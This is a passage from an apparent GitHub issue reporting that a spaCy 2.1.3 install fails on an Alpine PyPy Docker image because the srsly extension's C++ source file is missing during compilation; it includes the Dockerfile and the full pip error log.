jamiehewland/alpine-pypy:3.6-7.0\r\n\r\nRUN apk add --no-cache --virtual .build-deps musl-dev g++ \\\r\n    && apk add --no-cache openblas-dev \\\r\n    && pip install --no-cache-dir spacy==2.1.3 \\\r\n    && rm -rf ~/.cache \\\r\n    && apk del .build-deps\r\n```\r\n\r\nError output:\r\n```\r\n    ----------------------------------------\r\n    Failed building wheel for srsly\r\n    Running setup.py clean for srsly\r\n  Successfully built cymem preshed murmurhash thinc blis thinc-gpu-ops numpy wrapt\r\n  Failed to build srsly\r\n  Installing collected packages: setuptools, wheel, Cython, cymem, preshed, murmurhash, numpy, blis, thinc-gpu-ops, wrapt, plac, tqdm, six, wasabi, srsly, thinc\r\n    Running setup.py install for srsly: started\r\n      Running setup.py install for srsly: finished with status 'error'\r\n      Complete output from command /usr/local/bin/pypy3 -u -c \"import setuptools, tokenize;__file__='/tmp/pip-install-cxeja_a8/srsly/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, __file__, 'exec'))\" install --record /tmp/pip-record-c7x55i7s/install-record.txt --single-version-externally-managed --prefix /tmp/pip-build-env-8tt8bidn/overlay --compile:\r\n      running install\r\n      running build\r\n      running build_py\r\n      running build_ext\r\n      building 'srsly.msgpack._unpacker' extension\r\n      gcc -pthread -DNDEBUG -O2 -fPIC -D__LITTLE_ENDIAN__=1 -I/usr/local/include -I. -I/tmp/pip-install-cxeja_a8/srsly/include -I/usr/local/include -c srsly/msgpack/_unpacker.cpp -o build/temp.linux-x86_64-3.6/srsly/msgpack/_unpacker.o -O2 -Wno-strict-prototypes -Wno-unused-function\r\n      gcc: error: srsly/msgpack/_unpacker.cpp: No such file or directory\r\n      gcc: fatal error: no input files\r\n      compilation terminated.\r\n      error: command 'gcc' failed with exit status 1\r\n\r\n      ----------------------------------------\r\n```\r\n\r\nFYI build works OK on a standard python alpine docker image", "performed_via_github_app": null, "score": 1.0}]}